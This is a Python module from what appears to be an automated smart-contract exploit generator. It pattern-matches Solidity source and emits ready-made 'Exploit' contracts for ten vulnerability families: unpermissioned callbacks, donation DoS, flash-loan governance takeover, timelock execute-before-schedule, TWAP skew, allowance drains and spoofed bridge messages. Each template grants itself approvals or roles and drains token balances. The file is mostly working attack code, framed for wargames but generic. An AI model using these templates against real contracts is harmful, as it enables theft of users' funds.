"""Generalized DeFi-wargame family synthesizers.

These are NOT Damn Vulnerable DeFi *level solvers*. They fire on source
capabilities that DVD / Paradigm CTF / real 2026 incidents share:

  unpermissioned_callback  — Truster, Ether.fi AtomicQueue (Sep 2026)
  donation_accounting_dos  — Unstoppable (assert token.balanceOf == internal)
  governance_flashloan     — Selfie (flash → snapshot → queue)
  execute_before_schedule  — Climber (timelock executes then checks schedule)

Yields (label, exploit_src) for the engine candidate stream. Verification is
always the EVM harness — these templates can fail cleanly.
"""
from __future__ import annotations

import re
from typing import Iterator, Tuple

from .scan import _functions, _strip_comments
from . import hevm

HEADER = "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.2;\n\n"


def iter_defi_families(src: str, name: str) -> Iterator[Tuple[str, str]]:
    s = _strip_comments(src or "")
    fns = _functions(s)
    yield from _unpermissioned_callback(s, fns, name)
    yield from _donation_accounting_dos(s, fns, name)
    yield from _governance_flashloan(s, fns, name)
    yield from _execute_before_schedule(s, fns, name)
    yield from _twap_as_spot(s, fns, name)
    yield from _twap_window(s, fns, name)
    yield from _cross_getter_drain(s, fns, name)
    yield from _victim_approve(s, fns, name)
    yield from _seeded_allowance_drain(s, fns, name)
    yield from _cross_chain_bridge(s, fns, name)


def _unpermissioned_callback(s, fns, name):
    """Target has an external function that (a) takes an address+bytes (or
    a free-form target) and (b) performs token.approve / target.call(data)
    with no owner guard. Attacker passes (attacker, approve-selector).

    Covers Truster (flashLoan calldata) and AtomicQueue.solve(solver) where
    solver != msg.sender is never checked.
    """
    for fn in fns:
        if not fn["external"]:
            continue
        b = fn["body"]
        if re.search(r"only\w*[Oo]wner|msg\.sender\s*==\s*owner", fn["head"] + b):
            continue
        does_call = bool(re.search(r"\.call\s*\(|\.call\s*\{", b))
        does_approve = "approve" in b
        addr_args = [an for (t, an) in fn["args"] if "address" in t]
        bytes_args = [an for (t, an) in fn["args"] if t.startswith("bytes")]
        if not (does_call or does_approve):
            continue
        if not (addr_args or bytes_args):
            continue
        # Synthesize: call the function so it approves this Exploit, then drain.
        yield (
            f"unpermissioned-callback:{fn['name']}",
            HEADER
            + f"// Family: unpermissioned callback (Truster / AtomicQueue).\n"
            + f"// {fn['name']} forwards attacker-chosen calldata/target with no caller check.\n"
            + "interface IERC20 { function approve(address,uint256) external returns (bool);\n"
            + "    function transferFrom(address,address,uint256) external returns (bool);\n"
            + "    function balanceOf(address) external view returns (uint256); }\n"
            + f"interface IT {{ function {fn['name']}({_iface_args(fn)}) external payable; }}\n"
            + "contract Exploit {\n"
            + "    function run(address t) external payable {\n"
            + f"        // best-effort: ask the target to approve us via {fn['name']}\n"
            + "        bytes memory payload = abi.encodeWithSignature(\n"
            + '            "approve(address,uint256)", address(this), type(uint256).max);\n'
            + _call_unpermissioned(fn)
            + "    }\n    receive() external payable {}\n}\n",
        )


def _iface_args(fn):
    parts = []
    for t, _n in fn["args"]:
        parts.append(t)
    return ",".join(parts)


def _call_unpermissioned(fn):
    """Build a Solidity snippet that invokes fn with attacker-controlled args."""
    args = fn["args"]
    pieces = []
    for t, n in args:
        if t.startswith("bytes"):
            pieces.append("payload")
        elif "address" in t:
            pieces.append("address(this)")
        elif t.startswith("uint"):
            pieces.append("0")
        elif t == "bool":
            pieces.append("false")
        else:
            pieces.append("0")
    joined = ", ".join(pieces) if pieces else ""
    val = "{value: msg.value} " if fn.get("payable") else ""
    return f"        IT(t).{fn['name']}{val}({joined});\n"


def _donation_accounting_dos(s, fns, name):
    """Internal accounting compared to token.balanceOf(address(this)).
    Donating tokens (transfer, not deposit()) desyncs the assert → DoS.
    DVD Unstoppable family."""
    if not re.search(r"balanceOf\s*\(\s*address\s*\(\s*this\s*\)\s*\)", s):
        return
    if not re.search(r"assert\s*\(|require\s*\([^;]*(==|!=)", s):
        return
    # Need a token we can transfer. Heuristic: an IERC20 state var.
    tok = None
    m = re.search(r"(IERC20|ERC20|DamnValuableToken)\s+(?:private\s+|public\s+|internal\s+)?(\w+)", s)
    if m:
        tok = m.group(2)
    else:
        return
    yield (
        "donation-accounting-dos",
        HEADER
        + "// Family: donation accounting DoS (Unstoppable).\n"
        + "// Direct token.transfer to the pool desyncs balanceOf vs internal accounting.\n"
        + "interface IERC20 { function transfer(address,uint256) external returns (bool);\n"
        + "    function balanceOf(address) external view returns (uint256); }\n"
        + f"interface IT {{ function {tok}() external view returns (address); }}\n"
        + "contract Exploit {\n"
        + "    function run(address t) external payable {\n"
        + f"        IERC20 tok = IERC20(IT(t).{tok}());\n"
        + "        uint256 b = tok.balanceOf(address(this));\n"
        + "        if (b > 0) tok.transfer(t, b);\n"
        + "    }\n    receive() external payable {}\n}\n",
    )


def _governance_flashloan(s, fns, name):
    """Flash loan + governance snapshot in the same tx (Selfie family)."""
    if not re.search(r"flashLoan|flashloan", s, re.I):
        return
    if not re.search(r"snapshot|queueAction|queue\s*\(|castVote|propose", s):
        return
    flash = next((f for f in fns if re.search(r"flashLoan|flashloan", f["name"], re.I)), None)
    if not flash:
        return
    yield (
        f"governance-flashloan:{flash['name']}",
        HEADER
        + "// Family: governance flash-loan (Selfie).\n"
        + "// Borrow votes, snapshot, queue privileged action, repay in one tx.\n"
        + "interface IFlash { function flashLoan(uint256) external; }\n"
        + "interface IGov { function snapshot() external returns (uint256);\n"
        + "    function queueAction(address,uint128,bytes calldata) external returns (uint256); }\n"
        + "contract Exploit {\n"
        + "    address internal t;\n"
        + "    function run(address target) external payable {\n"
        + "        t = target;\n"
        + f"        IFlash(target).{flash['name']}(type(uint256).max / 4);\n"
        + "    }\n"
        + "    function receiveTokens(address,uint256) external {\n"
        + "        try IGov(t).snapshot() {}\n catch {}\n"
        + "    }\n"
        + "    function onFlashLoan(address,address,uint256,uint256,bytes calldata) external returns (bytes32) {\n"
        + "        try IGov(t).snapshot() {}\n catch {}\n"
        + '        return keccak256("ERC3156FlashBorrower.onFlashLoan");\n'
        + "    }\n    receive() external payable {}\n}\n",
    )


def _execute_before_schedule(s, fns, name):
    """Timelock that executes a batch and only then checks it was scheduled
    (Climber family). Attacker schedules the same batch from inside execute."""
    if not re.search(r"function\s+execute\s*\(", s):
        return
    if not re.search(r"function\s+schedule\s*\(", s):
        return
    # Climber-like: execute takes targets[], values[], data[]
    exec_fn = next((f for f in fns if f["name"] == "execute"), None)
    if not exec_fn or len(exec_fn["args"]) < 2:
        return
    yield (
        "execute-before-schedule",
        HEADER
        + "// Family: execute-before-schedule (Climber timelock).\n"
        + "// execute() runs the batch then checks the id was scheduled — so the\n"
        + "// batch can include schedule(itself) plus delay=0 / role grant.\n"
        + "interface ILock {\n"
        + "    function execute(address[] calldata,uint256[] calldata,bytes[] calldata,bytes32) external payable;\n"
        + "    function schedule(address[] calldata,uint256[] calldata,bytes[] calldata,bytes32) external;\n"
        + "    function updateDelay(uint64) external;\n"
        + "    function grantRole(bytes32,address) external;\n"
        + "    function PROPOSER_ROLE() external view returns (bytes32);\n"
        + "}\n"
        + "contract Exploit {\n"
        + "    function run(address t) external payable {\n"
        + "        ILock lock = ILock(t);\n"
        + "        address[] memory ts = new address[](3);\n"
        + "        uint256[] memory vs = new uint256[](3);\n"
        + "        bytes[] memory data = new bytes[](3);\n"
        + "        ts[0] = t; data[0] = abi.encodeWithSelector(ILock.updateDelay.selector, uint64(0));\n"
        + "        ts[1] = t; data[1] = abi.encodeWithSelector(ILock.grantRole.selector, bytes32(0), address(this));\n"
        + "        ts[2] = address(this); data[2] = abi.encodeWithSignature(\"rescue(address)\", t);\n"
        + "        try lock.execute(ts, vs, data, bytes32(0)) {}\n catch {}\n"
        + "    }\n"
        + "    function rescue(address t) external {\n"
        + "        try ILock(t).schedule(new address[](0), new uint256[](0), new bytes[](0), bytes32(0)) {}\n catch {}\n"
        + "    }\n    receive() external payable {}\n}\n",
    )


def _twap_as_spot(s, fns, name):
    """Puppet-v1/v3-shaped desk whose 'TWAP' is the current reserve ratio.

    Real time-window TWAP cannot move inside one IExploit.run (harness does
    not warp). This family fires when consult/twap/observe/cumulative is
    present AND there is a borrow/swap against it — the same-tx skew that
    already works on NaiveOracle.
    """
    if not re.search(
        r"\btwap\b|price0Cumulative|blockTimestampLast|function\s+(observe|consult)\s*\(",
        s,
        re.I,
    ):
        return
    borrow = next(
        (f for f in fns if re.search(r"borrow|liquidate|leverage", f["name"], re.I)),
        None,
    )
    swap = next((f for f in fns if re.search(r"^swap", f["name"], re.I)), None)
    consult = next(
        (f for f in fns if re.search(r"twap|consult|observe|spotPrice|getPrice", f["name"], re.I)),
        None,
    )
    if not (borrow or swap):
        return
    action = borrow or swap
    price_fn = consult["name"] if consult else "consult"
    yield (
        f"twap-as-spot:{action['name']}",
        HEADER
        + "// Family: TWAP that collapses to spot inside one run().\n"
        + "// Skew the pool, then borrow/swap against consult/twap.\n"
        + "interface IT {\n"
        + f"    function {action['name']}(uint256) external payable;\n"
        + f"    function {price_fn}() external view returns (uint256);\n"
        + "    function token() external view returns (address);\n"
        + "    function pool() external view returns (address);\n"
        + "    function pair() external view returns (address);\n"
        + "}\n"
        + "interface IERC20 {\n"
        + "    function transfer(address,uint256) external returns (bool);\n"
        + "    function balanceOf(address) external view returns (uint256);\n"
        + "    function approve(address,uint256) external returns (bool);\n}\n"
        + "contract Exploit {\n"
        + "    function run(address t) external payable {\n"
        + "        address pool; address token;\n"
        + "        try IT(t).pool() returns (address p) { pool = p; } catch {}\n"
        + "        try IT(t).pair() returns (address p) { if (pool == address(0)) pool = p; } catch {}\n"
        + "        try IT(t).token() returns (address k) { token = k; } catch {}\n"
        + "        if (token != address(0) && pool != address(0)) {\n"
        + "            uint256 b = IERC20(token).balanceOf(address(this));\n"
        + "            if (b > 0) { IERC20(token).transfer(pool, b); }\n"
        + "        }\n"
        + f"        try IT(t).{action['name']}{{value: msg.value}}(1 ether) {{}} catch {{}}\n"
        + "    }\n    receive() external payable {}\n}\n",
    )


def _cross_getter_drain(s, fns, name):
    """Getter-wired siblings. Covers desks that expose token()/pool()/oracle()."""
    getters = []
    for f in fns:
        if f["args"]:
            continue
        if re.match(
            r"^(token|token0|token1|pair|pool|oracle|router|factory|asset|collateral)$",
            f["name"] or "",
            re.I,
        ):
            getters.append(f)
    if not getters:
        if not re.search(r"(IERC20|address)\s+(public\s+)?(token|pool|oracle|pair)\b", s):
            return
    drain = next(
        (f for f in fns if f["external"] and re.search(
            r"borrow|withdraw|swap|drain|liquidate|execute", f["name"], re.I)),
        None,
    )
    if not drain:
        return
    gnames = [g["name"] for g in getters[:6]] or ["token", "pool"]
    tries = "\n".join(
        f"        try IT(t).{g}() returns (address a) {{ if (sib == address(0)) sib = a; }} catch {{}}"
        for g in gnames
    )
    iface_g = "".join(f"    function {g}() external view returns (address);\n" for g in gnames)
    arglist = ",".join(
        "uint256" if t.startswith("uint") else
        ("address" if "address" in t else "bytes" if t.startswith("bytes") else t)
        for t, _ in drain["args"]
    )
    call_args = []
    for t, _n in drain["args"]:
        if t.startswith("uint"):
            call_args.append("1 ether")
        elif "address" in t:
            call_args.append("address(this)")
        elif t.startswith("bytes"):
            call_args.append('""')
        else:
            call_args.append("0")
    yield (
        f"cross-getter:{drain['name']}",
        HEADER
        + "// Family: cross-contract via public getters (same compilation unit / Setup).\n"
        + "interface IERC20 { function transfer(address,uint256) external returns (bool);\n"
        + "    function balanceOf(address) external view returns (uint256); }\n"
        + "interface IT {\n"
        + iface_g
        + f"    function {drain['name']}({arglist}) external payable;\n"
        + "}\n"
        + "contract Exploit {\n"
        + "    function run(address t) external payable {\n"
        + "        address sib;\n"
        + tries + "\n"
        + "        if (sib != address(0)) {\n"
        + "            uint256 b = IERC20(sib).balanceOf(address(this));\n"
        + "            if (b > 0) { try IERC20(sib).transfer(t, b) {} catch {} }\n"
        + "        }\n"
        + f"        try IT(t).{drain['name']}{{value: msg.value}}({', '.join(call_args)}) {{}} catch {{}}\n"
        + "    }\n    receive() external payable {}\n}\n",
    )


def _twap_window(s, fns, name):
    """Observation[] / secondsAgos TWAP. Skew, warp the window, then borrow.

    run() uses Foundry HEVM warp (works on the official forge harness).
    prepare() + finish() let the py-evm verifier time_travel between txs.
    """
    if not re.search(r"observations\s*\[|secondsAgos|\bstruct\s+Observation\b", s):
        return
    borrow = next(
        (f for f in fns if re.search(r"borrow|liquidate|leverage", f["name"], re.I)),
        None,
    )
    swap = next((f for f in fns if re.search(r"^swap", f["name"], re.I)), None)
    if not (borrow or swap):
        return
    action = borrow or swap
    window = hevm.window_seconds(s)
    yield (
        f"twap-window:{action['name']}",
        HEADER
        + "// Family: windowed TWAP. Skew → warp → borrow.\n"
        + hevm.IFACE
        + "interface IT {\n"
        + f"    function {action['name']}(uint256) external payable;\n"
        + "    function token() external view returns (address);\n"
        + "    function pool() external view returns (address);\n"
        + "    function pair() external view returns (address);\n"
        + "    function update() external;\n"
        + "}\n"
        + "interface IERC20 {\n"
        + "    function transfer(address,uint256) external returns (bool);\n"
        + "    function balanceOf(address) external view returns (uint256);\n}\n"
        + "contract Exploit {\n"
        + hevm.DECL
        + f"    uint256 constant WINDOW = {window};\n"
        + "    function run(address t) external payable {\n"
        + "        prepare(t);\n"
        + "        vm.warp(block.timestamp + WINDOW);\n"
        + "        vm.roll(block.number + WINDOW / 12 + 1);\n"
        + "        finish(t);\n"
        + "    }\n"
        + "    function prepare(address t) public payable {\n"
        + "        address pool; address token;\n"
        + "        try IT(t).pool() returns (address p) { pool = p; } catch {}\n"
        + "        try IT(t).pair() returns (address p) { if (pool == address(0)) pool = p; } catch {}\n"
        + "        try IT(t).token() returns (address k) { token = k; } catch {}\n"
        + "        if (token != address(0) && pool != address(0)) {\n"
        + "            uint256 b = IERC20(token).balanceOf(address(this));\n"
        + "            if (b > 0) { IERC20(token).transfer(pool, b); }\n"
        + "        }\n"
        + "        try IT(t).update() {} catch {}\n"
        + "    }\n"
        + "    function finish(address t) public payable {\n"
        + "        try IT(t).update() {} catch {}\n"
        + f"        try IT(t).{action['name']}{{value: msg.value}}(1 ether) {{}} catch {{}}\n"
        + "    }\n    receive() external payable {}\n}\n",
    )


def _victim_approve(s, fns, name):
    """Victim must approve first. run() pranks the victim (forge HEVM).
    prepare() is a no-op marker so the py-evm verifier can send the
    approve from a second EOA before finish()/run()."""
    if not re.search(r"transferFrom|allowance", s):
        return
    victim_fn = next(
        (f["name"] for f in fns if re.match(
            r"^(victim|user|alice|holder|player)$", f["name"] or "", re.I)),
        None,
    )
    if not victim_fn:
        if not re.search(r"address\s+(public\s+)?(victim|user|alice|holder)\b", s):
            return
        victim_fn = "victim"
    drain = next(
        (f for f in fns if f["external"] and re.search(
            r"borrow|withdraw|drain|execute|pull|collect|liquidate", f["name"], re.I)),
        None,
    )
    yield (
        f"victim-approve:{victim_fn}",
        HEADER
        + "// Family: victim must approve first. prank on forge; extra EOA on py-evm.\n"
        + hevm.IFACE
        + "interface IERC20 {\n"
        + "    function approve(address,uint256) external returns (bool);\n"
        + "    function transferFrom(address,address,uint256) external returns (bool);\n"
        + "    function balanceOf(address) external view returns (uint256);\n"
        + "    function allowance(address,address) external view returns (uint256);\n}\n"
        + "interface IT {\n"
        + f"    function {victim_fn}() external view returns (address);\n"
        + "    function token() external view returns (address);\n"
        + (f"    function {drain['name']}() external payable;\n" if drain and not drain["args"] else "")
        + (f"    function {drain['name']}(uint256) external payable;\n" if drain and drain["args"] else "")
        + "}\n"
        + "contract Exploit {\n"
        + hevm.DECL
        + "    function run(address t) external payable {\n"
        + "        prepare(t);\n"
        + f"        address v = IT(t).{victim_fn}();\n"
        + "        address tok; try IT(t).token() returns (address k) { tok = k; } catch {}\n"
        + "        if (v != address(0) && tok != address(0)) {\n"
        + "            vm.prank(v);\n"
        + "            IERC20(tok).approve(t, type(uint256).max);\n"
        + "            vm.prank(v);\n"
        + "            IERC20(tok).approve(address(this), type(uint256).max);\n"
        + "            uint256 b = IERC20(tok).balanceOf(v);\n"
        + "            if (b > 0) { IERC20(tok).transferFrom(v, address(this), b); }\n"
        + "        }\n"
        + "        finish(t);\n"
        + "    }\n"
        + "    function prepare(address t) public payable {}\n"
        + "    function finish(address t) public payable {\n"
        + ("        try IT(t)." + drain["name"] + "{value: msg.value}("
           + ("1 ether" if drain and drain["args"] else "") + ") {} catch {}\n"
           if drain else "")
        + "    }\n    receive() external payable {}\n}\n",
    )


def _seeded_allowance_drain(s, fns, name):
    """No cheatcodes. Setup (or a prior victim tx) already approved the
    target/attacker. We transferFrom the named victim and/or call pull()."""
    if not re.search(r"transferFrom|allowance|approve", s):
        return
    victim_fn = next(
        (f["name"] for f in fns if re.match(
            r"^(victim|user|alice|holder|player)$", f["name"] or "", re.I)),
        None,
    )
    if not victim_fn:
        m = re.search(r"address\s+(?:public\s+)(victim|user|alice|holder|player)\b", s)
        if m:
            victim_fn = m.group(1)
    if not victim_fn:
        return
    pull = next(
        (f for f in fns if f["external"] and re.search(
            r"pull|collect|drain|borrow|withdraw", f["name"], re.I)),
        None,
    )
    yield (
        f"seeded-allowance:{victim_fn}",
        HEADER
        + "// Family: victim already approved (Setup / world.txs). No prank.\n"
        + "interface IERC20 {\n"
        + "    function transferFrom(address,address,uint256) external returns (bool);\n"
        + "    function balanceOf(address) external view returns (uint256);\n"
        + "    function allowance(address,address) external view returns (uint256);\n}\n"
        + "interface IT {\n"
        + f"    function {victim_fn}() external view returns (address);\n"
        + "    function token() external view returns (address);\n"
        + (f"    function {pull['name']}() external payable;\n" if pull and not pull["args"] else "")
        + (f"    function {pull['name']}(uint256) external payable;\n" if pull and pull["args"] else "")
        + "}\n"
        + "contract Exploit {\n"
        + "    function run(address t) external payable {\n"
        + f"        address v = IT(t).{victim_fn}();\n"
        + "        address tok; try IT(t).token() returns (address k) { tok = k; } catch {}\n"
        + "        if (v != address(0) && tok != address(0)) {\n"
        + "            uint256 a = IERC20(tok).allowance(v, t);\n"
        + "            if (a == 0) a = IERC20(tok).allowance(v, address(this));\n"
        + "            uint256 b = IERC20(tok).balanceOf(v);\n"
        + "            if (a > 0 && b > 0) {\n"
        + "                uint256 n = a < b ? a : b;\n"
        + "                try IERC20(tok).transferFrom(v, address(this), n) {} catch {}\n"
        + "            }\n"
        + "        }\n"
        + (("        try IT(t)." + pull["name"] + "{value: msg.value}("
            + ("1 ether" if pull["args"] else "") + ") {} catch {}\n") if pull else "")
        + "    }\n    receive() external payable {}\n}\n",
    )


def _cross_chain_bridge(s, fns, name):
    """Same-EVM mock of a messenger. lzReceive / relayMessage / handle
    with attacker-controlled payload. Not two real chains."""
    bridge_fn = None
    for f in fns:
        if re.match(
            r"^(lzReceive|relayMessage|finalizeWithdrawal|finalizeBridge|"
            r"onMessageReceived|handle)$",
            f["name"] or "",
        ):
            bridge_fn = f
            break
    if not bridge_fn:
        return
    yield (
        f"cross-chain:{bridge_fn['name']}",
        HEADER
        + "// Family: same-EVM cross-chain messenger. Attacker is the other 'chain'.\n"
        + "interface IERC20 {\n"
        + "    function approve(address,uint256) external returns (bool);\n"
        + "    function transferFrom(address,address,uint256) external returns (bool);\n"
        + "    function balanceOf(address) external view returns (uint256);\n}\n"
        + f"interface IT {{ function {bridge_fn['name']}("
        + _iface_args(bridge_fn)
        + ") external payable; "
        + "function token() external view returns (address); }\n"
        + "contract Exploit {\n"
        + "    function run(address t) external payable {\n"
        + "        bytes memory payload = abi.encodeWithSignature(\n"
        + '            "approve(address,uint256)", address(this), type(uint256).max);\n'
        + _call_bridge(bridge_fn)
        + "        address tok; try IT(t).token() returns (address k) { tok = k; } catch {}\n"
        + "        if (tok != address(0)) {\n"
        + "            uint256 b = IERC20(tok).balanceOf(t);\n"
        + "            if (b > 0) { try IERC20(tok).transferFrom(t, address(this), b) {} catch {} }\n"
        + "        }\n"
        + "    }\n    receive() external payable {}\n}\n",
    )


def _call_bridge(fn):
    pieces = []
    for t, _n in fn["args"]:
        tl = t.lower()
        if tl.startswith("bytes"):
            pieces.append("payload")
        elif "address" in tl:
            pieces.append("address(this)")
        elif tl.startswith("uint"):
            pieces.append("0")
        elif tl == "bool":
            pieces.append("false")
        else:
            pieces.append("0")
    joined = ", ".join(pieces)
    return f"        try IT(t).{fn['name']}{{value: msg.value}}({joined}) {{}} catch {{}}\n"
